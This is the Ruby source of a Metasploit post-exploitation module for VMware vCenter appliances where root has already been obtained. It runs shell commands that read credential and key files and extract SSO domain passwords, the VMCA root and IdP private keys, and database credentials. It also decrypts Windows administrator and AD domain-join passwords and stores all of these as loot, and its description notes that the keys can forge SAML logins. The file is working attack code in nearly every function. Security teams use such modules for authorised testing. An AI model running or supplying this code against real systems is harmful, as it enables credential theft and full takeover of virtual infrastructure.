##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Auxiliary::Report

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Secrets Dump',
        'Description' => %q{
          Grab secrets and keys from the vCenter server and add them to
          loot. This module is tested against the vCenter appliance only;
          it will not work on Windows vCenter instances. It is intended to
          be run after successfully acquiring root access on a vCenter
          appliance and is useful for penetrating further into the
          environment following a vCenter exploit that results in a root
          shell.

          Secrets include the dcAccountDN and dcAccountPassword for
          the vCenter machine which can be used for maniuplating the SSO
          domain via standard LDAP interface; good for plugging into the
          vmware_vcenter_vmdir_ldap module or for adding new SSO admin
          users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with
          associated private keys are also plundered and can be used to
          sign forged SAML assertions for the /ui admin interface.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'linux' ],
        'DisclosureDate' => '2022-04-15',
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'License' => MSF_LICENSE,
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Dump vCenter Secrets'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )
  end

  def run
    validate_target

    print_status('Gathering vSphere SSO Domain Information ...')
    vmdir_init

    print_status('Extracting certificates from vSphere platform ...')
    vmafd_dump

    print_status('Extracting PostgreSQL database credentials ...')
    get_db_creds

    print_status('Searching for secrets in VM Guest Customization Specification XML ...')
    enum_vm_cust_spec
  end

  def vmdir_init
    vsphere_machine_id = cmd_exec('/usr/lib/vmware-vmafd/bin/vmafd-cli get-machine-id --server-name localhost')
    if validate_uuid(vsphere_machine_id)
      vprint_status("vSphere Machine ID: #{vsphere_machine_id}")
    else
      fail_with(Msf::Exploit::Failure::Unknown, 'Invalid vSphere PSC Machine UUID returned from vmafd-cli')
    end

    vsphere_machine_hostname = cmd_exec('hostname')
    @vcenter_fqdn = vsphere_machine_hostname

    vsphere_machine_ipv4 = cmd_exec('ifconfig | grep eth0 -A1 | grep "inet addr" | awk -F \':\' \'{print $2}\' | awk -F \' \' \'{print $1}\'')
    if validate_ipv4(vsphere_machine_ipv4)
      print_status("vSphere Hostname and IPv4: #{@vcenter_fqdn} [#{vsphere_machine_ipv4}]")
    else
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vCenter eth0 IPv4!')
    end

    vsphere_domain_name = cmd_exec('/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmafd\Parameters]\'|grep DomainName|awk \'{print $4}\'|tr -d \'"\'')
    unless validate_fqdn(vsphere_domain_name)
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vSphere SSO domain name via lwregshell')
    end

    @base_fqdn = vsphere_domain_name.to_s.downcase
    vprint_status("vSphere SSO Domain FQDN: #{@base_fqdn}")

    vsphere_domain_dn = 'dc=' + @base_fqdn.split('.').join(',dc=')
    @base_dn = vsphere_domain_dn
    vprint_status("vSphere SSO Domain DN: #{@base_dn}")

    vprint_status('Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter ...')

    vsphere_domain_dc_dn = cmd_exec('/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountDN|awk \'{$1=$2=$3="";print $0}\'|tr -d \'"\'|sed -e \'s/^[ \t]*//\'')
    unless validate_dn(vsphere_domain_dc_dn)
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountDN from lwregshell')
    end

    @bind_dn = vsphere_domain_dc_dn
    print_good("vSphere SSO DC DN: #{@bind_dn}")

    @bind_pw = cmd_exec('printf $(/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountPassword|awk \'{print $4}\'|cut -c2-|rev|cut -c2-|rev)')
    unless @bind_pw
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountPassword from lwregshell')
    end

    print_good("vSphere SSO DC PW: #{@bind_pw}")

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 389,
      service_name: 'ldap',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @base_fqdn
    }

    store_valid_credential(user: @bind_dn, private: @bind_pw, service_data: extra_service_data)
  end

  def vmafd_dump
    get_vmca_cert
    get_idp_cert

    vcenter_machine_key = get_vecs_entry('getkey', 'MACHINE_SSL_CERT', '__MACHINE_CERT', 'ssl')
    vcenter_machine_cert = get_vecs_entry('getcert', 'MACHINE_SSL_CERT', '__MACHINE_CERT', 'ssl')

    unless vcenter_machine_cert.check_private_key(vcenter_machine_key)
      fail_with(Msf::Exploit::Failure::Unknown, 'MACHINE_SSL_CERT certificate and private key mismatch!')
    end

    vcenter_encipherment_key = get_vecs_entry('getkey', 'data-encipherment', 'data-encipherment', 'data')
    vcenter_encipherment_cert = get_vecs_entry('getcert', 'data-encipherment', 'data-encipherment', 'data')

    unless vcenter_encipherment_cert.check_private_key(vcenter_encipherment_key)
      fail_with(Msf::Exploit::Failure::Unknown, 'DATA-ENCIPHERMENT certificate and private key mismatch!')
    end

    @vc_cipher_key = vcenter_encipherment_key
  end

  def get_vmca_cert
    vprint_status('Extract VMCA_ROOT key ...')
    vmca_key_b64 = cmd_exec('cat /var/lib/vmware/vmca/privatekey.pem')

    unless (vmca_key = OpenSSL::PKey::RSA.new(vmca_key_b64))
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract VMCA_ROOT private key')
    end

    p = store_loot('vmca', 'PEM', rhost, vmca_key, 'VMCA_ROOT.key', 'vCenter VMCA root CA private key')
    print_good("VMCA_ROOT key: #{p}")

    vprint_status('Extract VMCA_ROOT cert ...')
    vmca_cert_b64 = cmd_exec('cat /var/lib/vmware/vmca/root.cer')

    unless (vmca_cert = OpenSSL::X509::Certificate.new(vmca_cert_b64))
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract VMCA_ROOT certificate')
    end

    unless vmca_cert.check_private_key(vmca_key)
      fail_with(Msf::Exploit::Failure::Unknown, 'VMCA_ROOT certificate and private key mismatch!')
    end

    p = store_loot('vmca', 'PEM', rhost, vmca_cert, 'VMCA_ROOT.pem', 'vCenter VMCA root CA certificate')
    print_good("VMCA_ROOT cert: #{p}")
  end

  def get_idp_cert
    shell_bind_pw = @bind_pw.gsub('"', '\"')

    vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')

    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"

    idp_keys = []
    idp_key = cmd_exec(shell_cmd).strip!
    keycol = "#{idp_key}\n"
    keycol.each_line do |line|
      b64formatted = line.scan(/.{1,64}/).join("\n")
      idp_key_b64 = "-----BEGIN PRIVATE KEY-----\n#{b64formatted}\n-----END PRIVATE KEY-----"
      unless (privkey = OpenSSL::PKey::RSA.new(idp_key_b64))
        fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate private key')
      end
      idp_keys << privkey
    end

    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w \"#{shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"

    idp_certs = []
    idp_chain = cmd_exec(shell_cmd).strip!
    certcol = "#{idp_chain}\n"
    certcol.each_line do |line|
      b64formatted = line.scan(/.{1,64}/).join("\n")
      idp_cert_b64 = "-----BEGIN CERTIFICATE-----\n#{b64formatted}\n-----END CERTIFICATE-----"
      unless (idp_cert = OpenSSL::X509::Certificate.new(idp_cert_b64))
        fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate chain')
      end
      idp_certs << idp_cert
    end

    vprint_status('Parsing vmwSTSTenantCredential certificates and keys ...')

    # vCenter vmdir stores the STS IdP signing credential under the following DN:
    #    cn=TenantCredential-1,cn=<sso domain>,cn=Tenants,cn=IdentityManager,cn=Services,<root dn>
    #
    # TODO: Right now this returns only the first valid keypair that is found and stops iterating
    #      or dies if no valid keypair is located. This is fine for 99% of cases but complex or
    #      unusual environments may have more than one TenantCredential and currently we stop
    #      extracting keys at the first valid pair.

    sts_cert = nil
    sts_key = nil
    sts_pem = nil

    idp_keys.each do |stskey|
      idp_certs.each do |stscert|
        next unless stscert.check_private_key(stskey)

        sts_cert = stscert.to_pem.to_s
        sts_key = stskey.to_pem.to_s
        if validate_sts_cert(sts_cert)
          vprint_status('Validated vSphere SSO IdP certificate against vSphere IDM tenant certificate')
        else # Query IDM to compare our extracted cert with the IDM advertised cert
          fail_with(Msf::Exploit::Failure::Unknown, 'Could not reconsile vmdir STS IdP cert chain with cert chain advertised by IDM')
        end
        sts_pem = "#{sts_key}#{sts_cert}"
      end
    end

    unless sts_pem # We were unable to link a public and private key together
      fail_with(Msf::Exploit::Failure::Unknown, 'Unable to associate IdP certificate and private key')
    end

    p = store_loot('idp', 'PEM', rhost, sts_key, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
    print_good("SSO_STS_IDP key: #{p}")

    p = store_loot('idp', 'PEM', rhost, sts_cert, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
    print_good("SSO_STS_IDP cert: #{p}")
  end

  def get_vecs_entry(entry_type, store_name, entry_alias, loot_alias)
    store_label = store_name.upcase

    case entry_type.downcase
    when 'getkey'
      vprint_status("Extract #{store_label} key ...")
      key_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getkey --store #{store_name} --alias #{entry_alias}")
      unless (key = OpenSSL::PKey::RSA.new(key_b64))
        fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} private key")
      end
      p = store_loot(loot_alias, 'PEM', rhost, key.to_pem.to_s, "#{store_label}.key", "vCenter #{store_label} Private Key")
      print_good("#{store_label} key: #{p}")
      return key
    when 'getcert'
      vprint_status("Extract #{store_label} cert ...")
      cert_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getcert --store #{store_name} --alias #{entry_alias}")
      unless (cert = OpenSSL::X509::Certificate.new(cert_b64))
        fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} certificate")
      end
      p = store_loot(loot_alias, 'PEM', rhost, cert.to_pem.to_s, "#{store_label}.pem", "vCenter #{store_label} Certificate")
      print_good("#{store_label} cert: #{p}")
      return cert
    else
      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vecs-cli directive: #{entry_type.downcase}")
    end
  end

  def enum_vm_cust_spec
    shell_cmd = "export PGPASSWORD='#{@vcdb_pass}'; psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT body FROM vpx_customization_spec WHERE name IN (SELECT name FROM vpx_customization_spec);' -P pager -A -t"
    xml = cmd_exec(shell_cmd).to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')

    xmldoc = Nokogiri::XML(xml) do |config|
      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
    end

    unless xmldoc
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not parse XML document from PSQL query output')
    end

    # Check for static local machine password
    if (sysprep_element_unattend = xmldoc.at_xpath('/ConfigRoot/identity/guiUnattended'))
      secret_is_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/plainText').text
      case secret_is_plaintext.downcase
      when 'true'
        secret_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
      when 'false'
        secret_ciphertext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
        ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
        secret_plaintext = @vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
      else
        fail_with(Msf::Exploit::Failure::BadConfig, 'Malformed customization specification XML recieved from vCenter')
      end
      print_status('Initial administrator account password found')
      print_good("Built-in administrator PW: #{secret_plaintext}")

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 445,
        protocol: 'tcp',
        service_name: 'Windows',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: '.'
      }

      store_valid_credential(user: '(local built-in administrator)', private: secret_plaintext, service_data: extra_service_data)
    end

    # Check for account used for domain join
    if (domain_element_unattend = xmldoc.at_xpath('//identification'))
      domain_user = domain_element_unattend.xpath('//identification/domainAdmin').text
      domain_base = domain_element_unattend.xpath('//identification/joinDomain').text

      secret_is_plaintext = domain_element_unattend.xpath('//identification/domainAdminPassword/plainText').text
      case secret_is_plaintext.downcase
      when 'true'
        secret_plaintext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
      when 'false'
        secret_ciphertext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
        ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
        secret_plaintext = @vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
      else
        fail_with(Msf::Exploit::Failure::BadConfig, 'Malformed customization specification XML recieved from vCenter')
      end

      print_status('AD domain join account found')
      print_good("AD User: #{domain_user}@#{domain_base}")
      print_good("AD Pass: #{secret_plaintext}")

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 445,
        protocol: 'tcp',
        service_name: 'Windows',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: domain_base
      }

      store_valid_credential(user: domain_user, private: secret_plaintext, service_data: extra_service_data)
    end
  end

  def get_db_creds
    shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep jdbc:postgresql:// | awk -F '/' '{print $4}' | awk -F '?' '{print $1}'"
    @vcdb_name = cmd_exec(shell_cmd)
    print_good("VCDB Name: #{@vcdb_name}")

    shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep username | awk -F '=' '{print $2}'| tr -d ' '"
    @vcdb_user = cmd_exec(shell_cmd)
    print_good("VCDB User: #{@vcdb_user}")

    shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep password | grep -v encrypted | awk -F '=' '{print $2}'| tr -d ' '"
    @vcdb_pass = cmd_exec(shell_cmd)
    print_good("VCDB PW: #{@vcdb_pass}")

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 5432,
      service_name: 'psql',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @vcdb_name
    }

    store_valid_credential(user: @vcdb_user, private: @vcdb_pass, service_data: extra_service_data)
  end

  def validate_uuid(uuid)
    uuid_regex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
    return true if uuid_regex.match?(uuid.to_s.downcase)

    false
  end

  def validate_ipv4(ipv4)
    ip = IPAddr.new ipv4.to_s
    unless ip
      return false
    end

    true
  end

  def validate_fqdn(fqdn)
    fqdn_regex = /(?=^.{4,253}$)(^((?!-)[a-z0-9-]{0,62}[a-z0-9]\.)+[a-z]{2,63}$)/
    return true if fqdn_regex.match?(fqdn.to_s.downcase)

    false
  end

  def validate_dn(dn)
    dn_regex = /^(?:(?<cn>cn=(?<name>[^,]*)),)?(?:(?<path>(?:(?:cn|ou)=[^,]+,?)+),)?(?<domain>(?:dc=[^,]+,?)+)$/
    return true if dn_regex.match?(dn.to_s.downcase)

    false
  end

  def validate_sts_cert(test_cert)
    unless (cert = OpenSSL::X509::Certificate.new(test_cert))
      fail_with(Msf::Exploit::Failure::Unknown, 'Invalid x509 certificate received')
    end

    vprint_status('Downloading advertised IDM tenant certificate chain from http://localhost:7080/idm/tenant/ on local vCenter ...')

    idm_cmd = cmd_exec("curl -f -s http://localhost:7080/idm/tenant/#{@base_fqdn}/certificates?scope=TENANT")

    if (idm_json = JSON.parse(idm_cmd).first)
      idm_json['certificates'].each do |idm|
        unless (cert_verify = OpenSSL::X509::Certificate.new(idm['encoded']))
          print_error('Invalid x509 certificate extracted from IDM!')
          return false
        end
        unless cert == cert_verify
          next
        end

        return true
      end
    else
      print_error('Unable to parse IDM tenant certificates downloaded from http://localhost:7080/idm/tenant/ on local vCenter')
      return false
    end

    print_error('No vSphere IDM tenant certificates returned from http://localhost:7080/idm/tenant/')
    false
  end

  def validate_target
    unless command_exists?('/usr/lib/vmware-vmafd/bin/vmafd-cli')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find vmafd-cli (is this host a vCenter appliance?)')
    end

    unless command_exists?('/usr/lib/vmware-vmafd/bin/vecs-cli')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find vecs-cli (is this host a vCenter appliance?)')
    end

    unless command_exists?('/opt/likewise/bin/lwregshell')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find lwregshell (is this host a vCenter appliance?)')
    end
  end

end
